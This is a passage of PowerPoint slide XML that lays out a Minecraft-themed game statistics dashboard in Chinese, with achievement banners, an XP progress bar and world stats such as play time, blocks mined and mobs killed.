            <p:cNvPr id="82" name="Text 80"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3056991" y="2583832"/>
              <a:ext cx="125876" cy="107894"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln/>
            <a:effectLst>
              <a:outerShdw blurRad="101600" dist="12700" dir="8100000" algn="bl" rotWithShape="0">
                <a:srgbClr val="000000">
                  <a:alpha val="100000"/>
                </a:srgbClr>
              </a:outerShdw>
            </a:effectLst>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr marL="0" indent="0">
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" sz="525" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="F0F0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48</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="83" name="Shape 81"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3254796" y="2368044"/>
              <a:ext cx="323681" cy="323681"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="8B8B8B"/>
            </a:solidFill>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="373737"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="84" name="Text 82"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3263788" y="2377035"/>
              <a:ext cx="305699" cy="30569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Segoe UI Emoji" pitchFamily="34" charset="0"/>
                  <a:ea typeface="Segoe UI Emoji" pitchFamily="34" charset="-122"/>
                  <a:cs typeface="Segoe UI Emoji" pitchFamily="34" charset="-120"/>
                </a:rPr>
                <a:t>💎</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="85" name="Text 83"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3434619" y="2583832"/>
              <a:ext cx="125876" cy="107894"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln/>
            <a:effectLst>
              <a:outerShdw blurRad="101600" dist="12700" dir="8100000" algn="bl" rotWithShape="0">
                <a:srgbClr val="000000">
                  <a:alpha val="100000"/>
                </a:srgbClr>
              </a:outerShdw>
            </a:effectLst>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr marL="0" indent="0">
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" sz="525" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="F0F0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7</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="86" name="Shape 84"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="143858" y="2817602"/>
              <a:ext cx="3506549" cy="467540"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="1A1A1A"/>
            </a:solidFill>
            <a:ln w="25400">
              <a:solidFill>
                <a:srgbClr val="5A5A5A"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="87" name="Shape 85"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="233770" y="2853566"/>
              <a:ext cx="899115" cy="107894"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="1A1A1A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88" name="Text 86"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="251752" y="2835584"/>
              <a:ext cx="1078938" cy="1078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buNone/>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" sz="525" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FFAA0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🏆 成就解锁！</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="89" name="Text 87"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="251752" y="2943478"/>
              <a:ext cx="323681" cy="3236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650" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Segoe UI Emoji" pitchFamily="34" charset="0"/>
                  <a:ea typeface="Segoe UI Emoji" pitchFamily="34" charset="-122"/>
                  <a:cs typeface="Segoe UI Emoji" pitchFamily="34" charset="-120"/>
                </a:rPr>
                <a:t>🐉</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="90" name="Text 88"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="611398" y="2943478"/>
              <a:ext cx="2877168" cy="143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750" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FFFF5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末影龙已被击败</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="91" name="Text 89"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="611398" y="3087336"/>
              <a:ext cx="2877168" cy="1258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AAAA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在末地击败末影龙 · 获得70点经验 · 解锁新纪元</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="92" name="Shape 90"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="143858" y="3357071"/>
              <a:ext cx="3506549" cy="467540"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="1A1A1A"/>
            </a:solidFill>
            <a:ln w="25400">
              <a:solidFill>
                <a:srgbClr val="5A5A5A"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="93" name="Shape 91"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="233770" y="3393035"/>
              <a:ext cx="899115" cy="107894"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="1A1A1A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94" name="Text 92"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="251752" y="3375053"/>
              <a:ext cx="1078938" cy="1078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buNone/>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" sz="525" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FFAA0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🏆 成就解锁！</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="95" name="Text 93"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="251752" y="3482947"/>
              <a:ext cx="323681" cy="3236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650" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Segoe UI Emoji" pitchFamily="34" charset="0"/>
                  <a:ea typeface="Segoe UI Emoji" pitchFamily="34" charset="-122"/>
                  <a:cs typeface="Segoe UI Emoji" pitchFamily="34" charset="-120"/>
                </a:rPr>
                <a:t>🌋</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="96" name="Text 94"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="611398" y="3482947"/>
              <a:ext cx="2877168" cy="143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750" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FFFF5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下界要塞探险者</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="97" name="Text 95"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="611398" y="3626805"/>
              <a:ext cx="2877168" cy="1258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AAAA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发现并清理了下界要塞 · 采集凋零头颅 3/3</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="600" dirty="0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3758301" y="911477"/>
            <a:ext cx="5241841" cy="3314431"/>
            <a:chOff x="3758301" y="911478"/>
            <a:chExt cx="5241841" cy="3110938"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="33" name="Shape 31"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7912212" y="2062345"/>
              <a:ext cx="143858" cy="287717"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="5C3D1E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7732389" y="1810593"/>
              <a:ext cx="503504" cy="287717"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="4A7C3F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7840283" y="1738664"/>
              <a:ext cx="287717" cy="143858"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="5BA050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>
              <a:off x="7372743" y="911478"/>
              <a:ext cx="287717" cy="287717"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="FFFF55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98" name="Shape 96"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3758301" y="983407"/>
              <a:ext cx="5241841" cy="557451"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="1A1A1A"/>
            </a:solidFill>
            <a:ln w="25400">
              <a:solidFill>
                <a:srgbClr val="5A5A5A"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="99" name="Text 97"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3848212" y="1037354"/>
              <a:ext cx="3596460" cy="1258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750" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FFFF55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⭐ 经验值</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="100" name="Shape 98"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3848212" y="1181212"/>
              <a:ext cx="5062018" cy="125876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373737"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="101" name="Shape 99"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3848212" y="1181212"/>
              <a:ext cx="3695273" cy="125876"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="55FF55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102" name="Text 100"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3848212" y="1181212"/>
              <a:ext cx="5062018" cy="125876"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln/>
            <a:effectLst>
              <a:outerShdw blurRad="101600" dist="12700" dir="8100000" algn="bl" rotWithShape="0">
                <a:srgbClr val="000000">
                  <a:alpha val="100000"/>
                </a:srgbClr>
              </a:outerShdw>
            </a:effectLst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563" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="F0F0F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Lv.47    6,847 / 9,380 XP</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="103" name="Text 101"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3848212" y="1361035"/>
              <a:ext cx="3596460" cy="1258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AAAAA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进度: 73%  —  下一升级需 2,533 XP</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="104" name="Shape 102"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3758301" y="1612788"/>
              <a:ext cx="5241841" cy="1618407"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="1A1A1A"/>
            </a:solidFill>
            <a:ln w="25400">
              <a:solidFill>
                <a:srgbClr val="5A5A5A"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="105" name="Text 103"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3848212" y="1684717"/>
              <a:ext cx="3596460" cy="1258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750" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FFFF55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📊 世界统计</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="106" name="Shape 104"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3848212" y="1846558"/>
              <a:ext cx="5062018" cy="8991"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="2A2A2A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107" name="Text 105"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3884177" y="1864540"/>
              <a:ext cx="2157876" cy="1618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675" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="AAAAA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游戏时间</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="108" name="Text 106"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6096000" y="1864540"/>
              <a:ext cx="2697345" cy="1618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675" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="55FF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1,247天 06:32:17</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="109" name="Shape 107"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3848212" y="2044363"/>
              <a:ext cx="5062018" cy="8991"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="2A2A2A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110" name="Text 108"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3884177" y="2062345"/>
              <a:ext cx="2157876" cy="1618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675" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="AAAAA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已走距离</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="111" name="Text 109"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6096000" y="2062345"/>
              <a:ext cx="2697345" cy="1618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675" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="55FF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142,830 格</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="112" name="Shape 110"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3848212" y="2242168"/>
              <a:ext cx="5062018" cy="8991"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="2A2A2A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113" name="Text 111"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3884177" y="2260150"/>
              <a:ext cx="2157876" cy="1618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675" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="AAAAA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已挖方块</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="114" name="Text 112"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6096000" y="2260150"/>
              <a:ext cx="2697345" cy="1618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675" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="55FF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86,421 个</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="115" name="Shape 113"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3848212" y="2439973"/>
              <a:ext cx="5062018" cy="8991"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="2A2A2A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116" name="Text 114"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3884177" y="2457956"/>
              <a:ext cx="2157876" cy="1618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675" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="AAAAA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已击杀怪物</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="117" name="Text 115"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6096000" y="2457956"/>
              <a:ext cx="2697345" cy="1618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675" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="55FF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4,218 只</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="118" name="Shape 116"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3848212" y="2637779"/>
              <a:ext cx="5062018" cy="8991"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="2A2A2A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119" name="Text 117"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3884177" y="2655761"/>
              <a:ext cx="2157876" cy="1618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675" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="AAAAA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死亡次数</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="120" name="Text 118"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6096000" y="2655761"/>
              <a:ext cx="2697345" cy="1618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675" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF5555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3 次</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="121" name="Shape 119"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3848212" y="2835584"/>
              <a:ext cx="5062018" cy="8991"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="2A2A2A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122" name="Text 120"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3884177" y="2853566"/>
              <a:ext cx="2157876" cy="1618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675" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="AAAAA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钒石总计</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="123" name="Text 121"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6096000" y="2853566"/>
              <a:ext cx="2697345" cy="1618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675" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="55FF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127 颗</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="124" name="Text 122"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3884177" y="3033389"/>
              <a:ext cx="719292" cy="1078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AAAA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🌾 食物</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="125" name="Shape 123"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4621451" y="3051372"/>
              <a:ext cx="3416637" cy="71929"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="333333"/>
            </a:solidFill>
            <a:ln w="6350">
              <a:solidFill>
                <a:srgbClr val="555555"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="126" name="Shape 124"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4621451" y="3051372"/>
              <a:ext cx="3245805" cy="71929"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="55AA00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127" name="Text 125"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8110018" y="3033389"/>
              <a:ext cx="719292" cy="1078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600" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="55AA0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满载</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="128" name="Text 126"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3884177" y="3177248"/>
              <a:ext cx="719292" cy="1078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AAAA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💎 钒石</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="129" name="Shape 127"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4621451" y="3195230"/>
              <a:ext cx="3416637" cy="71929"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="333333"/>
            </a:solidFill>
            <a:ln w="6350">
              <a:solidFill>
                <a:srgbClr val="555555"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="130" name="Shape 128"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4621451" y="3195230"/>
              <a:ext cx="2186648" cy="71929"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="0DDBDB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131" name="Text 129"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8110018" y="3177248"/>
              <a:ext cx="719292" cy="1078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600" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="0DDBD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127/∞</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="132" name="Text 130"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3884177" y="3321106"/>
              <a:ext cx="719292" cy="1078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AAAA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🔮 附魔</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="133" name="Shape 131"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4621451" y="3339088"/>
              <a:ext cx="3416637" cy="71929"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="333333"/>
            </a:solidFill>
            <a:ln w="6350">
              <a:solidFill>
                <a:srgbClr val="555555"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="134" name="Shape 132"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4621451" y="3339088"/>
              <a:ext cx="3416637" cy="71929"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="7733CC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135" name="Text 133"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8110018" y="3321106"/>
              <a:ext cx="719292" cy="1078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600" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="7733CC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等级30</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
            </a:p>
